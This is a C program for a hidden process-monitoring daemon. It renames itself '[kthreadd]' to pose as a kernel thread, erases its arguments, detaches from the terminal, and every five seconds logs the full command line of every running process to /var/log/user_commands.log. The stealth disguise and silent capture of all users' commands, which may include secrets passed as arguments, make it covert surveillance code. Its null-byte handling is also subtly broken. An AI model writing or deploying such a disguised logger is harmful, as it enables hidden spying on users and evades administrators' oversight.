#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <time.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>

#define LOG_FILE "/var/log/user_commands.log"
#define PROC_DIR "/proc"

void init_log_file() {
    int fd = open(LOG_FILE, O_CREAT | O_WRONLY | O_APPEND, 0600);
    if (fd >= 0) {
        close(fd);
    }
}

void log_proc_command(const char *pid) {
    char path[256], cmdline[1024], log_entry[2048];
    FILE *fp;
    time_t now;
    struct tm *t;

    snprintf(path, sizeof(path), "%s/%s/cmdline", PROC_DIR, pid);
    fp = fopen(path, "r");
    if (fp == NULL) return;

    if (fgets(cmdline, sizeof(cmdline), fp) != NULL) {
        for (int i = 0; cmdline[i]; i++) {
            if (cmdline[i] == '\0') cmdline[i] = ' ';
        }
        time(&now);
        t = localtime(&now);
        FILE *log_fp = fopen(LOG_FILE, "a");
        if (log_fp) {
            snprintf(log_entry, sizeof(log_entry), "[%04d-%02d-%02d %02d:%02d:%02d] PID: %s, Command: %s\n",
                     t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
                     t->tm_hour, t->tm_min, t->tm_sec, pid, cmdline);
            fputs(log_entry, log_fp);
            fclose(log_fp);
        }
    }
    fclose(fp);
}

void log_ps_commands() {
    char line[1024], log_entry[2048];
    FILE *ps_fp = popen("ps -ax -o pid,command", "r");
    if (ps_fp == NULL) return;

    time_t now;
    struct tm *t;
    time(&now);
    t = localtime(&now);

    FILE *log_fp = fopen(LOG_FILE, "a");
    if (!log_fp) {
        pclose(ps_fp);
        return;
    }

    fgets(line, sizeof(line), ps_fp);
    while (fgets(line, sizeof(line), ps_fp)) {
        line[strcspn(line, "\n")] = '\0';
        snprintf(log_entry, sizeof(log_entry), "[%04d-%02d-%02d %02d:%02d:%02d] %s\n",
                 t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
                 t->tm_hour, t->tm_min, t->tm_sec, line);
        fputs(log_entry, log_fp);
    }

    fclose(log_fp);
    pclose(ps_fp);
}

int main(int argc, char *argv[]) {
    strncpy(argv[0], "[kthreadd]", strlen(argv[0]));
    for (int i = 1; i < argc; i++) {
        if (argv[i]) memset(argv[i], 0, strlen(argv[i]));
    }

    if (fork() > 0) exit(0); 
    setsid(); 
    if (fork() > 0) exit(0);
    umask(0); 
    chdir("/"); 
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    init_log_file();

    int use_proc = access(PROC_DIR, R_OK) == 0;

    while (1) {
        if (use_proc) {
            DIR *dir = opendir(PROC_DIR);
            if (dir) {
                struct dirent *entry;
                while ((entry = readdir(dir)) != NULL) {
                    if (entry->d_type == DT_DIR && atoi(entry->d_name) > 0) {
                        log_proc_command(entry->d_name);
                    }
                }
                closedir(dir);
            }
        } else {
            log_ps_commands();
        }

        sleep(5); 
    }

    return 0;
}